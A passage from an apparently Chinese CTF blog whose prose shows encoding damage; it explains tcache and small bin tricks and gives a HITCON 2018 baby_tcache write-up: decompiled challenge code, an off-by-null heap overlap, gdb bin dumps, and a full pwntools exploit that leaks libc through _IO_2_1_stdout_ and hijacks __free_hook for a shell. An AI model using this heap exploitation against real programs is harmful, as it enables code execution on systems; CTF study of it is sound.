<li>å°†è‡³å°‘ä¸¤ä¸ªchunkä»unsorted binæ”¾åˆ°small binï¼Œè¿™ä¸ªè¿‡ç¨‹å¯ä»¥è§¦å‘malloc_consolidate()æ¥å®Œæˆ</li>
<li>å°†small binä¸­ç¬¬äºŒä¸ªchunkçš„bkæ”¹æˆç›®æ ‡åœ°å€</li>
<li>ä»è¿™ä¸ªsmall binä¸­å–å‡ºä¸€ä¸ªchunkï¼ŒåŒæ—¶è¦ä¿è¯tcacheä¸­è‡³å°‘æœ‰ä¸¤ä¸ªç©ºä½</li>
</ol>
<p>å¾ˆæ˜æ˜¾å¯ä»¥å‘ç°å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå› ä¸ºæƒ³è¦ç›´æ¥å°†small binå¤§å°çš„chunkæ”¾åˆ°unsorted binå°±æ„å‘³ç€å¯¹åº”å¤§å°çš„tcacheå·²ç»æ»¡äº†ï¼Œè€Œæˆ‘ä»¬åç»­ç”¨callocæ˜¯æ— æ³•ä»tcacheä¸­å–å‡ºchunkçš„ï¼Œé‚£ä¹ˆä¹Ÿå°±æ— æ³•æ»¡è¶³ç¬¬ä¸‰ç‚¹ä¸­çš„tcacheè¦æœ‰ç©ºä½çš„æ¡ä»¶ã€‚</p>
<p>è¿™æ—¶å°±æœ‰è§£å†³è¿™ä¸ªé—®é¢˜çš„æ€è·¯ä»¥åŠçŸ¥è¯†ç‚¹äº†ï¼šåˆ©ç”¨unsorted binä¸­çš„last remainderã€‚</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>]	A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span>);<span class="built_in">free</span>(A);	*<span class="number">7</span></span><br><span class="line">[<span class="number">2</span>]	A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span>);<span class="built_in">free</span>(A);	<span class="comment">//into unsorted bin</span></span><br><span class="line">[<span class="number">3</span>]	A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span><span class="number">-0x100</span>);			<span class="comment">//last remainder size == 0x100</span></span><br><span class="line">[<span class="number">4</span>]	<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span>);			<span class="comment">//last remainder into small bin</span></span><br></pre></td></tr></table></figure>

<p>è§£é‡Šï¼šé¦–å…ˆå°†0x400å¤§å°çš„tcacheå¡æ»¡ï¼Œæ­¤æ—¶å†freeä¸€å—0x400çš„chunkï¼Œè¿™ä¸ªchunkå°±ä¼šè¿›å…¥åˆ°unsorted binä¸­ã€‚ç„¶åç”³è¯·0x300å¤§å°çš„chunkï¼Œé‚£ä¹ˆè¿™ä¸ª0x310çš„chunkå°±ä¼šä»unsorted biné‡Œå‰²å‡ºæ¥ï¼Œlast remainderå°±æ˜¯å‰©ä¸‹çš„0x100ã€‚æœ€åç”³è¯·ä¸€ä¸ªæ¯”0x100å¤§çš„chunkï¼Œlast remainderå°±ä¼šç›´æ¥è¢«æ”¾è¿›å¯¹åº”çš„binä¸­ã€‚</p>
<h3 id="HITCON-2018-PWN-baby-tcache"><a href="#HITCON-2018-PWN-baby-tcache" class="headerlink" title="HITCON 2018 PWN baby_tcache"></a>HITCON 2018 PWN baby_tcache</h3><p>ï¼ˆlibc-2.27ï¼‰</p>
<p>è¿™é¢˜çš„éš¾ç‚¹åœ¨äºæ²¡æœ‰æ³„æ¼ç‚¹ï¼Œè¦çŸ¥é“æ€ä¹ˆä¿®æ”¹<code>_IO_2_1_stdout_</code>è¿™ä¸ªç»“æ„ä½“æ¥å®Œæˆæ³„æ¼çš„çŸ¥è¯†ç‚¹ã€‚</p>
<p>åœ¨æ­¤ä¹‹å‰è¿˜éœ€è¦ç”¨off-by-oneæ„é€ å †é‡å ï¼Œä»¥æ­¤è·å¾—uafçš„æ•ˆæœã€‚</p>
<p>å„å‡½æ•°å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ğŸŠ      Baby Tcache      ğŸŠ&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$   1. New heap           $&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$   2. Delete heap        $ &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$   3. Exit               $ &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v2) = <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !heap[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = sub_B27(<span class="string">&quot;Size:&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  sub_B88(v5, size);</span><br><span class="line">  v5[size] = <span class="number">0</span>;</span><br><span class="line">  heap[i] = v5;		<span class="comment">//off-by-null</span></span><br><span class="line">  v2 = heap_size;</span><br><span class="line">  heap_size[i] = size;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = sub_B27();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heap[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(heap[v1], <span class="number">0xDA</span>, heap_size[v1]);</span><br><span class="line">    <span class="built_in">free</span>(heap[v1]);</span><br><span class="line">    heap[v1] = <span class="number">0LL</span>;</span><br><span class="line">    heap_size[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;:)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¿æŠ¤å…¨å¼€ï¼Œç¨‹åºé€»è¾‘å’ŒåŠŸèƒ½éƒ½å¾ˆç®€å•ï¼Œåªæœ‰addå’Œfreeä¸¤ä¸ªåŠŸèƒ½ï¼Œè€Œä¸”åªæœ‰ä¸€ä¸ªoff-by-nullæ¼æ´</p>
<h4 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>ä¸ºäº†æ»¡è¶³unlinkå¯¹fd/bkçš„æ£€æŸ¥ï¼Œæœ€å‰é¢çš„è¢«åˆå¹¶çš„å—éœ€è¦èƒ½å¤Ÿè¿›åˆ°unsorted binæ¥è®¾ç½®å…¶fd/bkï¼ŒåŒæ—¶ä¸ºäº†é¿å…tcacheçš„å½±å“ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¤§å—</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#6</span></span><br></pre></td></tr></table></figure>

<p>chunk5æ˜¯åé¢è¦ç”¨æ¥è§¦å‘åˆå¹¶çš„å—ï¼Œchunk1-4æ˜¯ä¸­é—´ç”¨æ¥è¢«åˆå¹¶çš„å—ï¼Œä¸ºäº†åç»­çš„ä½¿ç”¨æ‰€ä»¥å¤šå¤¹äº†å‡ å—ï¼ŒåŒæ—¶ç”³è¯·chunk6ç”¨æ¥é˜²æ­¢å’Œtop chunkåˆå¹¶</p>
<p>åˆ°è¿™é‡Œä¸ºæ­¢æˆ‘ä»¬éœ€è¦ç”¨chunk4æ¥ä¿®æ”¹chunk5çš„prev sizeä»¥åŠinuseä½ï¼Œè¿™ä¸ªå¾ˆç®€å•ï¼ŒæŠŠchunk4 freeæ‰ä¹‹åå†ç”³è¯·å‡ºæ¥å°±è¡Œã€‚</p>
<p>å› ä¸ºchunk0å¤§äºtcacheçš„èŒƒå›´ï¼Œæ‰€ä»¥ç›´æ¥freeæ‰å®ƒå°±èƒ½è¿›unsorted binã€‚</p>
<p>åŒæ—¶å—é‡å æœ¬èº«çš„ç›®çš„å°±æ˜¯ä¸ºäº†ä¿®æ”¹ä¸­é—´chunkçš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æŠŠchunk1-3ä¹Ÿç»™freeæ‰ï¼Œè¦æ³¨æ„çš„æ˜¯è¿™æ—¶chunk4æ˜¯ä¸èƒ½freeæ‰çš„ï¼Œç†ç”±å¾ˆç®€å•ï¼Œfreeæ‰ä¹‹åchunk5çš„prev sizeå°±è¢«æ”¹æ‰äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x660</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>åˆ°æ­¤ä¸ºæ­¢å®ç°çš„æ•ˆæœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x55967c335760 â—‚â€” 0x0</span><br><span class="line">0x50 [  1]: 0x55967c3357a0 â—‚â€” 0x0</span><br><span class="line">0x60 [  1]: 0x55967c3357f0 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55967c335250 â€”â–¸ 0x7fef7531bca0 (main_arena+96) â—‚â€” 0x55967c335250</span><br></pre></td></tr></table></figure>

<p>åªéœ€è¦æ³¨æ„unsorted binçš„åˆ‡åˆ†å¤§å°å°±å¯ä»¥å®ç°ä¿®æ”¹ä¸­é—´å—çš„fdæŒ‡é’ˆ</p>
<p>ç„¶åæŠŠchunk0ä»unsorted binä¸­å‰²èµ°ï¼Œè¿™æ ·å°±è®©chunk1çš„fd/bkæŒ‡é’ˆæŒ‡å‘äº†unsorted binçš„main_arenaï¼Œæˆ‘ä»¬åœ¨å‰²èµ°chunk1çš„åŒæ—¶å°±å¯ä»¥éƒ¨åˆ†è¦†å†™å…¶fdæŒ‡é’ˆï¼Œè®©å…¶æŒ‡å‘<code>_IO_2_1_stdout_</code></p>
<p>å› ä¸ºæˆ‘ä»¬è¦è®©chunk1ç•™åœ¨tcacheï¼Œæ‰€ä»¥è¿™æ¬¡æŠŠchunk1å’Œchunk2ä¸€èµ·å‰²èµ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(0x4f0,&#x27;a&#x27;)</span><br><span class="line">add(0x80,&#x27;\x60\x07&#x27;)</span><br></pre></td></tr></table></figure>

<p>åˆ°æ­¤ä¸ºæ­¢å®ç°çš„æ•ˆæœå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x555555758760</span> â€”â–¸ <span class="number">0x7ffff7dd0760</span> (_IO_2_1_stdout_) â—‚â€” <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x5555557587a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x5555557587f0</span> â€”â–¸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) â€”â–¸ <span class="number">0x555555758e30</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555557587e0</span> â€”â–¸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x5555557587e0</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°tcacheä¸­0x40ï¼ˆä¹Ÿå°±æ˜¯chunk1ï¼‰çš„chunkçš„fdå·²ç»è¢«æ”¹æˆäº†<code>_IO_2_1_stdout_</code>ç»“æ„ä½“æ‰€åœ¨çš„åœ°å€ï¼Œè¿™ä¸€è¿‡ç¨‹åˆ©ç”¨çš„æ˜¯å·²æœ‰çš„main_arenaæ¥éƒ¨åˆ†è¦†å†™å®ç°çš„ï¼Œè¦æ³¨æ„çš„æ˜¯ç”±äºASLRçš„ç¼˜æ•…ï¼Œ<code>_IO_2_1_stdout_</code>çš„åœ°å€å…¶å®æ˜¯æœ‰ä¸€ä½éœ€è¦çˆ†ç ´çš„ï¼Œä¹Ÿå°±æ˜¯æœ¬é¢˜ä¸­è¦†å†™æ—¶çš„<code>\x07</code>çš„è¿™ä¸ª0</p>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥æŠŠ<code>_IO_2_1_stdout_</code>ä»tcacheä¸­ç”³è¯·å‡ºæ¥å¹¶ä¸”è¦†å†™å…¶ä¸­çš„å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œä¸ºæ­¢å°±å®Œæˆäº†libcçš„æ³„æ¼ï¼Œå†ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œå‰²èµ°chunk3çš„åŒæ—¶ä¿®æ”¹å…¶fdæŒ‡é’ˆä¸º<code>__free_hook</code>å³å¯</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x660</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;\x60\x07&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x30</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.recv(<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7dd18b0</span> - <span class="number">0x00007ffff79e4000</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">    free_hook = libc_base + (<span class="number">0x7ffff7dd18e8</span> - <span class="number">0x00007ffff79e4000</span>)</span><br><span class="line">    og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">    one = libc_base + og[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,p64(one))</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&quot;baby_tcache&quot;</span>)</span><br><span class="line">		pwn()</span><br><span class="line">		p.interactive()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/12/gdb%E5%8A%A0%E8%BD%BDlibc%E6%BA%90%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/12/gdb%E5%8A%A0%E8%BD%BDlibc%E6%BA%90%E7%A0%81/" class="post-title-link" itemprop="url">gdbåŠ è½½libcæºç </a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-12 21:52:28" itemprop="dateCreated datePublished" datetime="2022-05-12T21:52:28+08:00">2022-05-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-20 17:26:34" itemprop="dateModified" datetime="2022-05-20T17:26:34+08:00">2022-05-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="æ­å»ºGlibcæºç è°ƒè¯•ç¯å¢ƒ"><a href="#æ­å»ºGlibcæºç è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="æ­å»ºGlibcæºç è°ƒè¯•ç¯å¢ƒ"></a>æ­å»ºGlibcæºç è°ƒè¯•ç¯å¢ƒ</h3><p>æ–¹æ³•ä¹Ÿæ˜¯ä»åˆ«äººçš„åšå®¢å«–çš„ï¼Œä¸ºäº†é˜²æ­¢æä¸¢æ‰€ä»¥è¿™é‡Œç®€å•è®°ä¸€ä¸‹</p>
<p>èƒ½è·Ÿæºç æ˜¯çœŸçš„èˆ’æœï¼Œå †åˆ©ç”¨åœ¨è®²åŸç†æ—¶å¾€å¾€ç”©ä¸€å †æºç è¿‡æ¥ï¼Œç„¶åé‡Œé¢ä¸€äº›å˜é‡æŒ‡çš„æ˜¯ä»€ä¹ˆä¹Ÿä¸è¯´æ¸…æ¥šï¼Œå¯¼è‡´ç¨å¾®å¤æ‚ç‚¹çš„æºç å°±å¾ˆéš¾å®¡æ‡‚ï¼ˆä¹Ÿè®¸æ˜¯æˆ‘çš„é—®é¢˜ï¼‰</p>
<p>åœ¨gdbé‡Œèƒ½åŠ è½½æºç ä¹‹åç›´æ¥è·Ÿåˆ°æƒ³çœ‹çš„ä½ç½®å†ç¨å¾®è·Ÿä¸€ä¸‹å°±èƒ½æ¯”è¾ƒç®€å•åœ°ææ‡‚ä¸€äº›ä»£ç å®ç°äº†ä»€ä¹ˆåŠŸèƒ½ï¼Œä»¥åŠæ€æ ·å®ç°çš„â€¦â€¦</p>
